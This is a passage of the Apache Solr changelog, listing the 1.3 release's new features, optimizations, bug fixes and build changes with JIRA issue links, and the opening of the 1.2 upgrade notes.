  17. [SOLR-248](http://issues.apache.org/jira/browse/SOLR-248): Added CapitalizationFilterFactory that creates tokens with
      normalized capitalization. This filter is useful for facet display,
      but will not work with a prefix query. (ryan)
      [SOLR-468](http://issues.apache.org/jira/browse/SOLR-468): Change to the semantics to keep the original token, not the
      token in the Map. Also switched to use Lucene's new reusable token
      capabilities.

      (gsingers)
  18. [SOLR-307](http://issues.apache.org/jira/browse/SOLR-307): Added NGramFilterFactory and EdgeNGramFilterFactory.

      (Thomas Peuss via Otis Gospodnetic)
  19. [SOLR-305](http://issues.apache.org/jira/browse/SOLR-305): analysis.jsp can be given a fieldtype instead of a field
      name.

      (hossman)
  20. [SOLR-102](http://issues.apache.org/jira/browse/SOLR-102): Added RegexFragmenter, which splits text for highlighting
      based on a given pattern.

      (klaas)
  21. [SOLR-258](http://issues.apache.org/jira/browse/SOLR-258): Date Faceting added to SimpleFacets. Facet counts
      computed for ranges of size facet.date.gap (a DateMath expression)
      between facet.date.start and facet.date.end.

      (hossman)
  22. [SOLR-196](http://issues.apache.org/jira/browse/SOLR-196): A PHP serialized "phps" response writer that returns a
      serialized array that can be used with the PHP function unserialize,
      and a PHP response writer "php" that may be used by eval.

      (Nick Jenkin, Paul Borgermans, Pieter Berkel via yonik)
  23. [SOLR-308](http://issues.apache.org/jira/browse/SOLR-308): A new UUIDField class which accepts UUID string values,
      as well as the special value of "NEW" which triggers generation of
      a new random UUID.

      (Thomas Peuss via hossman)
  24. [SOLR-349](http://issues.apache.org/jira/browse/SOLR-349): New FunctionQuery functions: sum, product, div, pow, log,
      sqrt, abs, scale, map. Constants may now be used as a value source.

      (yonik)
  25. [SOLR-359](http://issues.apache.org/jira/browse/SOLR-359): Add field type className to Luke response, and enabled access
      to the detailed field information from the solrj client API.

      (Grant Ingersoll via ehatcher)
  26. [SOLR-334](http://issues.apache.org/jira/browse/SOLR-334): Pluggable query parsers. Allows specification of query
      type and arguments as a prefix on a query string.

      (yonik)
  27. [SOLR-351](http://issues.apache.org/jira/browse/SOLR-351): External Value Source. An external file may be used
      to specify the values of a field, currently usable as
      a ValueSource in a FunctionQuery.

      (yonik)
  28. [SOLR-395](http://issues.apache.org/jira/browse/SOLR-395): Many new features for the spell checker implementation, including
      an extended response mode with much richer output, multi-word spell checking,
      and a bevy of new and renamed options (see the wiki).

      (Mike Krimerman, Scott Taber via klaas).
  29. [SOLR-408](http://issues.apache.org/jira/browse/SOLR-408): Added PingRequestHandler and deprecated SolrCore.getPingQueryRequest().
      Ping requests should be configured using standard RequestHandler syntax in
      solrconfig.xml rather then using the <pingQuery></pingQuery> syntax.

      (Karsten Sperling via ryan)
  30. [SOLR-281](http://issues.apache.org/jira/browse/SOLR-281): Added a 'Search Component' interface and converted StandardRequestHandler
      and DisMaxRequestHandler to use this framework.

      (Sharad Agarwal, Henri Biestro, yonik, ryan)
  31. [SOLR-176](http://issues.apache.org/jira/browse/SOLR-176): Add detailed timing data to query response output. The SearchHandler
      interface now returns how long each section takes.

      (klaas)
  32. [SOLR-414](http://issues.apache.org/jira/browse/SOLR-414): Plugin initialization now supports SolrCore and ResourceLoader "Aware"
      plugins. Plugins that implement SolrCoreAware or ResourceLoaderAware are
      informed about the SolrCore/ResourceLoader.

      (Henri Biestro, ryan)
  33. [SOLR-350](http://issues.apache.org/jira/browse/SOLR-350): Support multiple SolrCores running in the same solr instance and allows
      runtime runtime management for any running SolrCore. If a solr.xml file exists
      in solr.home, this file is used to instanciate multiple cores and enables runtime
      core manipulation. For more informaion see: <http://wiki.apache.org/solr/CoreAdmin>

      (Henri Biestro, ryan)
  34. [SOLR-447](http://issues.apache.org/jira/browse/SOLR-447): Added an single request handler that will automatically register all
      standard admin request handlers. This replaces the need to register (and maintain)
      the set of admin request handlers. Assuming solrconfig.xml includes:
      <requestHandler name="/admin/" class="org.apache.solr.handler.admin.AdminHandlers" />
      This will register: Luke/SystemInfo/PluginInfo/ThreadDump/PropertiesRequestHandler.

      (ryan)
  35. [SOLR-142](http://issues.apache.org/jira/browse/SOLR-142): Added RawResponseWriter and ShowFileRequestHandler. This returns config
      files directly. If AdminHandlers are configured, this will be added automatically.
      The jsp files /admin/get-file.jsp and /admin/raw-schema.jsp have been deprecated.
      The deprecated <admin><gettableFiles> will be automatically registered with
      a ShowFileRequestHandler instance for backwards compatibility.

      (ryan)
  36. [SOLR-446](http://issues.apache.org/jira/browse/SOLR-446): TextResponseWriter can write SolrDocuments and SolrDocumentLists the
      same way it writes Document and DocList.

      (yonik, ryan)
  37. [SOLR-418](http://issues.apache.org/jira/browse/SOLR-418): Adding a query elevation component. This is an optional component to
      elevate some documents to the top positions (or exclude them) for a given query.

      (ryan)
  38. [SOLR-478](http://issues.apache.org/jira/browse/SOLR-478): Added ability to get back unique key information from the LukeRequestHandler.

      (gsingers)
  39. [SOLR-127](http://issues.apache.org/jira/browse/SOLR-127): HTTP Caching awareness. Solr now recognizes HTTP Request
      headers related to HTTP Caching (see RFC 2616 sec13) and will respond
      with "304 Not Modified" when appropriate. New options have been added
      to solrconfig.xml to influence this behavior.

      (Thomas Peuss via hossman)
  40. [SOLR-303](http://issues.apache.org/jira/browse/SOLR-303): Distributed Search over HTTP. Specification of shards
      argument causes Solr to query those shards and merge the results
      into a single response. Querying, field faceting (sorted only),
      query faceting, highlighting, and debug information are supported
      in distributed mode.

      (Sharad Agarwal, Patrick O'Leary, Sabyasachi Dalal, Stu Hood,
      Jayson Minard, Lars Kotthoff, ryan, yonik)
  41. [SOLR-356](http://issues.apache.org/jira/browse/SOLR-356): Pluggable functions (value sources) that allow
      registration of new functions via solrconfig.xml

      (Doug Daniels via yonik)
  42. [SOLR-494](http://issues.apache.org/jira/browse/SOLR-494): Added cool admin Ajaxed schema explorer.

      (Greg Ludington via ehatcher)
  43. [SOLR-497](http://issues.apache.org/jira/browse/SOLR-497): Added date faceting to the QueryResponse in SolrJ
      and QueryResponseTest

      (Shalin Shekhar Mangar via gsingers)
  44. [SOLR-486](http://issues.apache.org/jira/browse/SOLR-486): Binary response format, faster and smaller
      than XML and JSON response formats (use wt=javabin).
      BinaryResponseParser for utilizing the binary format via SolrJ
      and is now the default.

      (Noble Paul, yonik)
  45. [SOLR-521](http://issues.apache.org/jira/browse/SOLR-521): StopFilterFactory support for "enablePositionIncrements"

      (Walter Ferrara via hossman)
  46. [SOLR-557](http://issues.apache.org/jira/browse/SOLR-557): Added SolrCore.getSearchComponents() to return an unmodifiable Map.

      (gsingers)
  47. [SOLR-516](http://issues.apache.org/jira/browse/SOLR-516): Added hl.maxAlternateFieldLength parameter, to set max length for hl.alternateField

      (Koji Sekiguchi via klaas)
  48. [SOLR-319](http://issues.apache.org/jira/browse/SOLR-319): Changed SynonymFilterFactory to "tokenize" synonyms file.
      To use a tokenizer, specify "tokenizerFactory" attribute in <filter>.
      For example:
      <tokenizer class="solr.CJKTokenizerFactory"/>
      <filter class="solr.SynonymFilterFactory" synonyms="synonyms.txt" expand="true"
      ignoreCase="true" tokenizerFactory="solr.CJKTokenizerFactory"/>

      (koji)
  49. [SOLR-515](http://issues.apache.org/jira/browse/SOLR-515): Added SimilarityFactory capability to schema.xml,
      making config file parameters usable in the construction of
      the global Lucene Similarity implementation.

      (ehatcher)
  50. [SOLR-536](http://issues.apache.org/jira/browse/SOLR-536): Add a DocumentObjectBinder to solrj that converts Objects to and
      from SolrDocuments.

      (Noble Paul via ryan)
  51. [SOLR-595](http://issues.apache.org/jira/browse/SOLR-595): Add support for Field level boosting in the MoreLikeThis Handler.

      (Tom Morton, gsingers)
  52. [SOLR-572](http://issues.apache.org/jira/browse/SOLR-572): Added SpellCheckComponent and org.apache.solr.spelling package to support more spell
      checking functionality. Also includes ability to add your own SolrSpellChecker implementation that
      plugs in. See <http://wiki.apache.org/solr/SpellCheckComponent> for more details

      (Shalin Shekhar Mangar, Bojan Smid, gsingers)
  53. [SOLR-679](http://issues.apache.org/jira/browse/SOLR-679): Added accessor methods to Lucene based spell checkers

      (gsingers)
  54. [SOLR-423](http://issues.apache.org/jira/browse/SOLR-423): Added Request Handler close hook notification so that RequestHandlers can be notified
      when a core is closing.

      (gsingers, ryan)
  55. [SOLR-603](http://issues.apache.org/jira/browse/SOLR-603): Added ability to partially optimize.

      (gsingers)
  56. [SOLR-483](http://issues.apache.org/jira/browse/SOLR-483): Add byte/short sorting support

      (gsingers)
  57. [SOLR-14](http://issues.apache.org/jira/browse/SOLR-14): Add preserveOriginal flag to WordDelimiterFilter

      (Geoffrey Young, Trey Hyde, Ankur Madnani, yonik)
  58. [SOLR-502](http://issues.apache.org/jira/browse/SOLR-502): Add search timeout support.

      (Sean Timm via yonik)
  59. [SOLR-605](http://issues.apache.org/jira/browse/SOLR-605): Add the ability to register callbacks programatically

      (ryan, Noble Paul)
  60. [SOLR-610](http://issues.apache.org/jira/browse/SOLR-610): hl.maxAnalyzedChars can be -1 to highlight everything

      (Lars Kotthoff via klaas)
  61. [SOLR-522](http://issues.apache.org/jira/browse/SOLR-522): Make analysis.jsp show payloads.

      (Tricia Williams via yonik)
  62. [SOLR-611](http://issues.apache.org/jira/browse/SOLR-611): Expose sort\_values returned by QueryComponent in SolrJ's QueryResponse

      (Dan Rosher via shalin)
  63. [SOLR-256](http://issues.apache.org/jira/browse/SOLR-256): Support exposing Solr statistics through JMX

      (Sharad Agrawal, shalin)
  64. [SOLR-666](http://issues.apache.org/jira/browse/SOLR-666): Expose warmup time in statistics for SolrIndexSearcher and LRUCache

      (shalin)
  65. [SOLR-663](http://issues.apache.org/jira/browse/SOLR-663): Allow multiple files for stopwords, keepwords, protwords and synonyms

      (Otis Gospodnetic, shalin)
  66. [SOLR-469](http://issues.apache.org/jira/browse/SOLR-469): Added DataImportHandler as a contrib project which makes indexing data from Databases,
      XML files and HTTP data sources into Solr quick and easy. Includes API and implementations for
      supporting multiple data sources, processors and transformers for importing data. Supports full
      data imports as well as incremental (delta) indexing. See <http://wiki.apache.org/solr/DataImportHandler>
      for more details.

      (Noble Paul, shalin)
  67. [SOLR-622](http://issues.apache.org/jira/browse/SOLR-622): SpellCheckComponent supports auto-loading indices on startup and optionally, (re)builds
      indices on newSearcher event, if configured in solrconfig.xml

      (shalin)
  68. [SOLR-554](http://issues.apache.org/jira/browse/SOLR-554): Hierarchical JDK log level selector for SOLR Admin replaces logging.jsp

      (Sean Timm via shalin)
  69. [SOLR-506](http://issues.apache.org/jira/browse/SOLR-506): Emitting HTTP Cache headers can be enabled or disabled through configuration on a
      per-handler basis

      (shalin)
  70. [SOLR-716](http://issues.apache.org/jira/browse/SOLR-716): Added support for properties in configuration files. Properties can be specified in
      solr.xml and can be used in solrconfig.xml and schema.xml

      (Henri Biestro, hossman, ryan, shalin)
  71. [SOLR-1129](http://issues.apache.org/jira/browse/SOLR-1129) : Support binding dynamic fields to beans in SolrJ

      (Avlesh Singh , noble)
  72. [SOLR-920](http://issues.apache.org/jira/browse/SOLR-920) : Cache and reuse IndexSchema . A new attribute added in solr.xml called 'shareSchema'

      (noble)
  73. [SOLR-700](http://issues.apache.org/jira/browse/SOLR-700): DIH: Allow configurable locales through a locale attribute in
      fields for NumberFormatTransformer.

      (Stefan Oestreicher, shalin)
+ Changes in runtime behavior   (4)
  1. [SOLR-559](http://issues.apache.org/jira/browse/SOLR-559): use Lucene updateDocument, deleteDocuments methods. This
     removes the maxBufferedDeletes parameter added by [SOLR-310](http://issues.apache.org/jira/browse/SOLR-310) as Lucene
     now manages the deletes. This provides slightly better indexing
     performance and makes overwrites atomic, eliminating the possibility of
     a crash causing duplicates.

     (yonik)
  2. [SOLR-689](http://issues.apache.org/jira/browse/SOLR-689) / [SOLR-695](http://issues.apache.org/jira/browse/SOLR-695): If you have used "MultiCore" functionality in an unreleased
     version of 1.3-dev, many classes and configs have been renamed for the official
     1.3 release. Speciffically, solr.xml has replaced multicore.xml, and uses a slightly
     different syntax. The solrj classes: MultiCore{Request/Response/Params} have been
     renamed: CoreAdmin{Request/Response/Params}

     (hossman, ryan, Henri Biestro)
  3. [SOLR-647](http://issues.apache.org/jira/browse/SOLR-647): reference count the SolrCore uses to prevent a premature
     close while a core is still in use.

     (Henri Biestro, Noble Paul, yonik)
  4. [SOLR-737](http://issues.apache.org/jira/browse/SOLR-737): SolrQueryParser now uses a ConstantScoreQuery for wildcard
     queries that prevent an exception from being thrown when the number
     of matching terms exceeds the BooleanQuery clause limit.

     (yonik)
+ Optimizations   (10)
  1. [SOLR-276](http://issues.apache.org/jira/browse/SOLR-276): improve JSON writer speed.

     (yonik)
  2. [SOLR-310](http://issues.apache.org/jira/browse/SOLR-310): bound and reduce memory usage by providing <maxBufferedDeletes> parameter,
     which flushes deleted without forcing the user to use <commit/> for this purpose.

     (klaas)
  3. [SOLR-348](http://issues.apache.org/jira/browse/SOLR-348): short-circuit faceting if less than mincount docs match.

     (yonik)
  4. [SOLR-354](http://issues.apache.org/jira/browse/SOLR-354): Optimize removing all documents. Now when a delete by query
     of \*:\* is issued, the current index is removed.

     (yonik)
  5. [SOLR-377](http://issues.apache.org/jira/browse/SOLR-377): Speed up response writers.

     (yonik)
  6. [SOLR-342](http://issues.apache.org/jira/browse/SOLR-342): Added support into the SolrIndexWriter for using several new features of the new
     LuceneIndexWriter, including: setRAMBufferSizeMB(), setMergePolicy(), setMergeScheduler.
     Also, added support to specify Lucene's autoCommit functionality (not to be confused with Solr's
     similarily named autoCommit functionality) via the <luceneAutoCommit> config. item. See the test
     and example solrconfig.xml <indexDefaults> section for usage. Performance during indexing should
     be significantly increased by moving up to 2.3 due to Lucene's new indexing capabilities.
     Furthermore, the setRAMBufferSizeMB makes it more logical to decide on tuning factors related to
     indexing. For best performance, leave the mergePolicy and mergeScheduler as the defaults and set
     ramBufferSizeMB instead of maxBufferedDocs. The best value for this depends on the types of
     documents in use. 32 should be a good starting point, but reports have shown up to 48 MB provides
     good results. Note, it is acceptable to set both ramBufferSizeMB and maxBufferedDocs, and Lucene
     will flush based on whichever limit is reached first.

     (gsingers)
  7. [SOLR-330](http://issues.apache.org/jira/browse/SOLR-330): Converted TokenStreams to use Lucene's new char array based
     capabilities.

     (gsingers)
  8. [SOLR-624](http://issues.apache.org/jira/browse/SOLR-624): Only take snapshots if there are differences to the index

     (Richard Trey Hyde via gsingers)
  9. [SOLR-587](http://issues.apache.org/jira/browse/SOLR-587): Delete by Query performance greatly improved by using
     new underlying Lucene IndexWriter implementation.

     (yonik)
  10. [SOLR-730](http://issues.apache.org/jira/browse/SOLR-730): Use read-only IndexReaders that don't synchronize
      isDeleted(). This will speed up function queries and \*:\* queries
      as well as improve their scalability on multi-CPU systems.

      (Mark Miller via yonik)
+ Bug Fixes   (53)
  1. Make TextField respect sortMissingFirst and sortMissingLast fields.

     (J.J. Larrea via yonik)
  2. autoCommit/maxDocs was not working properly when large autoCommit/maxTime
     was specified

     (klaas)
  3. [SOLR-283](http://issues.apache.org/jira/browse/SOLR-283): autoCommit was not working after delete.

     (ryan)
  4. [SOLR-286](http://issues.apache.org/jira/browse/SOLR-286): ContentStreamBase was not using default encoding for getBytes()

     (Toru Matsuzawa via ryan)
  5. [SOLR-292](http://issues.apache.org/jira/browse/SOLR-292): Fix MoreLikeThis facet counting.

     (Pieter Berkel via ryan)
  6. [SOLR-297](http://issues.apache.org/jira/browse/SOLR-297): Fix bug in RequiredSolrParams where requiring a field
     specific param would fail if a general default value had been supplied.

     (hossman)
  7. [SOLR-331](http://issues.apache.org/jira/browse/SOLR-331): Fix WordDelimiterFilter handling of offsets for synonyms or
     other injected tokens that can break highlighting.

     (yonik)
  8. [SOLR-282](http://issues.apache.org/jira/browse/SOLR-282): Snapshooter does not work on Solaris and OS X since the cp command
     there does not have the -l option. Also updated commit/optimize related
     scripts to handle both old and new response format.

     (bill)
  9. [SOLR-294](http://issues.apache.org/jira/browse/SOLR-294): Logging of elapsed time broken on Solaris because the date command
     there does not support the %s output format.

     (bill)
  10. [SOLR-136](http://issues.apache.org/jira/browse/SOLR-136): Snappuller - "date -d" and locales don't mix.

      (JÃ¼rgen Hermann via bill)
  11. [SOLR-333](http://issues.apache.org/jira/browse/SOLR-333): Changed distributiondump.jsp to use Solr HOME instead of CWD to set path.
  12. [SOLR-393](http://issues.apache.org/jira/browse/SOLR-393): Removed duplicate contentType from raw-schema.jsp.

      (bill)
  13. [SOLR-413](http://issues.apache.org/jira/browse/SOLR-413): Requesting a large numbers of documents to be returned (limit)
      can result in an out-of-memory exception, even for a small index.

      (yonik)
  14. The CSV loader incorrectly threw an exception when given
      header=true (the default).

      (ryan, yonik)
  15. [SOLR-449](http://issues.apache.org/jira/browse/SOLR-449): the python and ruby response writers are now able to correctly
      output NaN and Infinity in their respective languages.

      (klaas)
  16. [SOLR-42](http://issues.apache.org/jira/browse/SOLR-42): HTMLStripReader tokenizers now preserve correct source
      offsets for highlighting.

      (Grant Ingersoll via yonik)
  17. [SOLR-481](http://issues.apache.org/jira/browse/SOLR-481): Handle UnknownHostException in \_info.jsp

      (gsingers)
  18. [SOLR-324](http://issues.apache.org/jira/browse/SOLR-324): Add proper support for Long and Doubles in sorting, etc.

      (gsingers)
  19. [SOLR-496](http://issues.apache.org/jira/browse/SOLR-496): Cache-Control max-age changed to Long so Expires
      calculation won't cause overflow.

      (Thomas Peuss via hossman)
  20. [SOLR-535](http://issues.apache.org/jira/browse/SOLR-535): Fixed typo (Tokenzied -> Tokenized) in schema.jsp

      (Thomas Peuss via billa)
  21. [SOLR-529](http://issues.apache.org/jira/browse/SOLR-529): Better error messages from SolrQueryParser when field isn't
      specified and there is no defaultSearchField in schema.xml

      (Lars Kotthoff via hossman)
  22. [SOLR-530](http://issues.apache.org/jira/browse/SOLR-530): Better error messages/warnings when parsing schema.xml:
      field using bogus fieldtype and multiple copyFields to a non-multiValue
      field.

      (Shalin Shekhar Mangar via hossman)
  23. [SOLR-528](http://issues.apache.org/jira/browse/SOLR-528): Better error message when defaultSearchField is bogus or not
      indexed.

      (Lars Kotthoff via hossman)
  24. [SOLR-533](http://issues.apache.org/jira/browse/SOLR-533): Fixed tests so they don't use hardcoded port numbers.

      (hossman)
  25. [SOLR-400](http://issues.apache.org/jira/browse/SOLR-400): SolrExceptionTest should now handle using OpenDNS as a DNS provider

      (gsingers)
  26. [SOLR-541](http://issues.apache.org/jira/browse/SOLR-541): Legacy XML update support (provided by SolrUpdateServlet
      when no RequestHandler is mapped to "/update") now logs error correctly.

      (hossman)
  27. [SOLR-267](http://issues.apache.org/jira/browse/SOLR-267): Changed logging to report number of hits, and also provide a mechanism to add log
      messages to be output by the SolrCore via a NamedList toLog member variable.

      (Will Johnson, yseeley, gsingers)
      - [SOLR-267](http://issues.apache.org/jira/browse/SOLR-267): Removed adding values to the HTTP headers in SolrDispatchFilter

        (gsingers)
  28. [SOLR-509](http://issues.apache.org/jira/browse/SOLR-509): Moved firstSearcher event notification to the end of the SolrCore constructor

      (Koji Sekiguchi via gsingers)
  29. [SOLR-470](http://issues.apache.org/jira/browse/SOLR-470), [SOLR-552](http://issues.apache.org/jira/browse/SOLR-552), [SOLR-544](http://issues.apache.org/jira/browse/SOLR-544), [SOLR-701](http://issues.apache.org/jira/browse/SOLR-701): Multiple fixes to DateField
      regarding lenient parsing of optional milliseconds, and correct
      formating using the canonical representation. LegacyDateField has
      been added for people who have come to depend on the existing
      broken behavior.

      (hossman, Stefan Oestreicher)
  30. [SOLR-539](http://issues.apache.org/jira/browse/SOLR-539): Fix for non-atomic long counters and a cast fix to avoid divide
      by zero.

      (Sean Timm via Otis Gospodnetic)
  31. [SOLR-514](http://issues.apache.org/jira/browse/SOLR-514): Added explicit media-type with UTF\* charset to \*.xsl files that
      don't already have one.

      (hossman)
  32. [SOLR-505](http://issues.apache.org/jira/browse/SOLR-505): Give RequestHandlers the possiblity to suppress the generation
      of HTTP caching headers.

      (Thomas Peuss via Otis Gospodnetic)
  33. [SOLR-553](http://issues.apache.org/jira/browse/SOLR-553): Handle highlighting of phrase terms better when
      hl.usePhraseHighligher=true URL param is used.

      (Bojan Smid via Otis Gospodnetic)
  34. [SOLR-590](http://issues.apache.org/jira/browse/SOLR-590): Limitation in pgrep on Linux platform breaks script-utils fixUser.

      (Hannes Schmidt via billa)
  35. [SOLR-597](http://issues.apache.org/jira/browse/SOLR-597): SolrServlet no longer "caches" SolrCore. This was causing
      problems in Resin, and could potentially cause problems for customized
      usages of SolrServlet.
  36. [SOLR-585](http://issues.apache.org/jira/browse/SOLR-585): Now sets the QParser on the ResponseBuilder

      (gsingers)
  37. [SOLR-604](http://issues.apache.org/jira/browse/SOLR-604): If the spellchecking path is relative, make it relative to the Solr Data Directory.

      (Shalin Shekhar Mangar via gsingers)
  38. [SOLR-584](http://issues.apache.org/jira/browse/SOLR-584): Make stats.jsp and stats.xsl more robust.

      (Yousef Ourabi and hossman)
  39. [SOLR-443](http://issues.apache.org/jira/browse/SOLR-443): SolrJ: Declare UTF-8 charset on POSTed parameters
      to avoid problems with servlet containers that default to latin-1
      and allow switching of the exact POST mechanism for parameters
      via useMultiPartPost in CommonsHttpSolrServer.

      (Lars Kotthoff, Andrew Schurman, ryan, yonik)
  40. [SOLR-556](http://issues.apache.org/jira/browse/SOLR-556): multi-valued fields always highlighted in disparate snippets

      (Lars Kotthoff via klaas)
  41. [SOLR-501](http://issues.apache.org/jira/browse/SOLR-501): Fix admin/analysis.jsp UTF-8 input for some other servlet
      containers such as Tomcat.

      (Hiroaki Kawai, Lars Kotthoff via yonik)
  42. [SOLR-616](http://issues.apache.org/jira/browse/SOLR-616): SpellChecker accuracy configuration is not applied for FileBasedSpellChecker.
      Apply it for FileBasedSpellChecker and IndexBasedSpellChecker both.

      (shalin)
  43. [SOLR-648](http://issues.apache.org/jira/browse/SOLR-648): SpellCheckComponent throws NullPointerException on using spellcheck.q request
      parameter after restarting Solr, if reload is called but build is not called.

      (Jonathan Lee, shalin)
  44. [SOLR-598](http://issues.apache.org/jira/browse/SOLR-598): DebugComponent now always occurs last in the SearchHandler list unless the
      components are explicitly declared.

      (gsingers)
  45. [SOLR-676](http://issues.apache.org/jira/browse/SOLR-676): DataImportHandler should use UpdateRequestProcessor API instead of directly
      using UpdateHandler.

      (shalin)
  46. [SOLR-696](http://issues.apache.org/jira/browse/SOLR-696): Fixed bug in NamedListCodec in regards to serializing Iterable objects.

      (gsingers)
  47. [SOLR-669](http://issues.apache.org/jira/browse/SOLR-669): snappuler fix for FreeBSD/Darwin (Richard "Trey" Hyde via Otis Gospodnetic)
  48. [SOLR-606](http://issues.apache.org/jira/browse/SOLR-606): Fixed spell check collation offset issue.

      (Stefan Oestreicher , Geoffrey Young, gsingers)
  49. [SOLR-589](http://issues.apache.org/jira/browse/SOLR-589): Improved handling of badly formated query strings

      (Sean Timm via Otis Gospodnetic)
  50. [SOLR-749](http://issues.apache.org/jira/browse/SOLR-749): Allow QParser and ValueSourceParsers to be extended with same name

      (hossman, gsingers)
  51. [SOLR-704](http://issues.apache.org/jira/browse/SOLR-704): DIH NumberFormatTransformer can silently ignore part of the
      string while parsing. Now it tries to use the complete string for parsing.
      Failure to do so will result in an exception.

      (Stefan Oestreicher via shalin)
  52. [SOLR-729](http://issues.apache.org/jira/browse/SOLR-729): DIH Context.getDataSource(String) gives current entity's
      DataSource instance regardless of argument.

      (Noble Paul, shalin)
  53. [SOLR-726](http://issues.apache.org/jira/browse/SOLR-726): DIH: Jdbc Drivers and DataSources fail to load if placed in
      multicore sharedLib or core's lib directory.

      (Walter Ferrara, Noble Paul, shalin)
+ Other Changes   (27)
  1. [SOLR-135](http://issues.apache.org/jira/browse/SOLR-135): Moved common classes to org.apache.solr.common and altered the
     build scripts to make two jars: apache-solr-1.3.jar and
     apache-solr-1.3-common.jar. This common.jar can be used in client code;
     It does not have lucene or junit dependencies. The original classes
     have been replaced with a @Deprecated extended class and are scheduled
     to be removed in a later release. While this change does not affect API
     compatibility, it is recommended to update references to these
     deprecated classes.

     (ryan)
  2. [SOLR-268](http://issues.apache.org/jira/browse/SOLR-268): Tweaks to post.jar so it prints the error message from Solr.

     (Brian Whitman via hossman)
  3. Upgraded to Lucene 2.2.0; June 18, 2007.
  4. [SOLR-215](http://issues.apache.org/jira/browse/SOLR-215): Static access to SolrCore.getSolrCore() and SolrConfig.config
     have been deprecated in order to support multiple loaded cores.

     (Henri Biestro via ryan)
  5. [SOLR-367](http://issues.apache.org/jira/browse/SOLR-367): The create method in all TokenFilter and Tokenizer Factories
     provided by Solr now declare their specific return types instead of just
     using "TokenStream"

     (hossman)
  6. [SOLR-396](http://issues.apache.org/jira/browse/SOLR-396): Hooks add to build system for automatic generation of (stub)
     Tokenizer and TokenFilter Factories.
     Also: new Factories for all Tokenizers and TokenFilters provided by the
     lucene-analyzers-2.2.0.jar -- includes support for German, Chinese,
     Russan, Dutch, Greek, Brazilian, Thai, and French.

     (hossman)
  7. Upgraded to commons-CSV r609327, which fixes escaping bugs and
     introduces new escaping and whitespace handling options to
     increase compatibility with different formats.

     (yonik)
  8. Upgraded to Lucene 2.3.0; Jan 23, 2008.
  9. [SOLR-451](http://issues.apache.org/jira/browse/SOLR-451): Changed analysis.jsp to use POST instead of GET, also made the input area a
     bit bigger

     (gsingers)
  10. Upgrade to Lucene 2.3.1
  11. [SOLR-531](http://issues.apache.org/jira/browse/SOLR-531): Different exit code for rsyncd-start and snappuller if disabled

      (Thomas Peuss via billa)
  12. [SOLR-550](http://issues.apache.org/jira/browse/SOLR-550): Clarified DocumentBuilder addField javadocs

      (gsingers)
  13. Upgrade to Lucene 2.3.2
  14. [SOLR-518](http://issues.apache.org/jira/browse/SOLR-518): Changed luke.xsl to use divs w/css for generating histograms
      instead of SVG

      (Thomas Peuss via hossman)
  15. [SOLR-592](http://issues.apache.org/jira/browse/SOLR-592): Added ShardParams interface and changed several string literals
      to references to constants in CommonParams.

      (Lars Kotthoff via Otis Gospodnetic)
  16. [SOLR-520](http://issues.apache.org/jira/browse/SOLR-520): Deprecated unused LengthFilter since already core in
      Lucene-Java

      (hossman)
  17. [SOLR-645](http://issues.apache.org/jira/browse/SOLR-645): Refactored SimpleFacetsTest

      (Lars Kotthoff via hossman)
  18. [SOLR-591](http://issues.apache.org/jira/browse/SOLR-591): Changed Solrj default value for facet.sort to true

      (Lars Kotthoff via Shalin)
  19. Upgraded to Lucene 2.4-dev (r669476) to support [SOLR-572](http://issues.apache.org/jira/browse/SOLR-572)

      (gsingers)
  20. [SOLR-636](http://issues.apache.org/jira/browse/SOLR-636): Improve/simplify example configs; and make index.jsp
      links more resilient to configs loaded via an InputStream

      (Lars Kotthoff, hossman)
  21. [SOLR-682](http://issues.apache.org/jira/browse/SOLR-682): Scripts now support FreeBSD

      (Richard Trey Hyde via gsingers)
  22. [SOLR-489](http://issues.apache.org/jira/browse/SOLR-489): Added in deprecation comments.

      (Sean Timm, Lars Kothoff via gsingers)
  23. [SOLR-692](http://issues.apache.org/jira/browse/SOLR-692): Migrated to stable released builds of StAX API 1.0.1 and StAX 1.2.0

      (shalin)
  24. Upgraded to Lucene 2.4-dev (r686801)

      (yonik)
  25. Upgraded to Lucene 2.4-dev (r688745) 27-Aug-2008

      (yonik)
  26. Upgraded to Lucene 2.4-dev (r691741) 03-Sep-2008

      (yonik)
  27. Replaced the StAX reference implementation with the geronimo
      StAX API jar, and the Woodstox StAX implementation.

      (yonik)
+ Build   (7)
  1. [SOLR-411](http://issues.apache.org/jira/browse/SOLR-411). Changed the names of the Solr JARs to use the defacto standard JAR names based on
     project-name-version.jar. This yields, for example:
     apache-solr-common-1.3-dev.jar
     apache-solr-solrj-1.3-dev.jar
     apache-solr-1.3-dev.jar
  2. [SOLR-479](http://issues.apache.org/jira/browse/SOLR-479): Added clover code coverage targets for committers and the nightly build. Requires
     the Clover library, as licensed to Apache and only available privately. To run:
     ant -Drun.clover=true clean clover test generate-clover-reports
  3. [SOLR-510](http://issues.apache.org/jira/browse/SOLR-510): Nightly release includes client sources.

     (koji)
  4. [SOLR-563](http://issues.apache.org/jira/browse/SOLR-563): Modified the build process to build contrib projects

     (Shalin Shekhar Mangar via Otis Gospodnetic)
  5. [SOLR-673](http://issues.apache.org/jira/browse/SOLR-673): Modify build file to create javadocs for core, solrj, contrib and "all inclusive"

     (shalin)
  6. [SOLR-672](http://issues.apache.org/jira/browse/SOLR-672): Nightly release includes contrib sources.

     (Jeremy Hinegardner, shalin)
  7. [SOLR-586](http://issues.apache.org/jira/browse/SOLR-586): Added ant target and POM files for building maven artifacts of the Solr core, common,
     client and contrib. The target can publish artifacts with source and javadocs.

     (Spencer Crissman, Craig McClanahan, shalin)

### Release 1.2 [2007-06-06]

+ Upgrading from Solr 1.1   (6)
  1. IMPORTANT UPGRADE NOTE: In a master/slave configuration, all searchers/slaves
     should be upgraded before the master! If the master were to be updated
     first, the older searchers would not be able to read the new index format.
  2. Older Apache Solr installations can be upgraded by replacing
     the relevant war file with the new version. No changes to configuration
     files should be needed.
  3. This version of Solr contains a new version of Lucene implementing
     an updated index format. This version of Solr/Lucene can still read
     and update indexes in the older formats, and will convert them to the new
     format on the first index change. One change in the new index format
     is that all "norms" are kept in a single file, greatly reducing the number
     of files per segment. Users of compound file indexes will want to consider
     converting to the non-compound format for faster indexing and slightly better
     search concurrency.
  4. The JSON response format for facets has changed to make it easier for
     clients to retain sorted order. Use json.nl=map explicitly in clients
     to get the old behavior, or add it as a default to the request handler
     in solrconfig.xml
  5. The Lucene based Solr query syntax is slightly more strict.
     A ':' in a field value must be escaped or the whole value must be quoted.
  6. The Solr "Request Handler" framework has been updated in two key ways:
     First, if a Request Handler is registered in solrconfig.xml with a name
     starting with "/" then it can be accessed using path-based URL, instead of
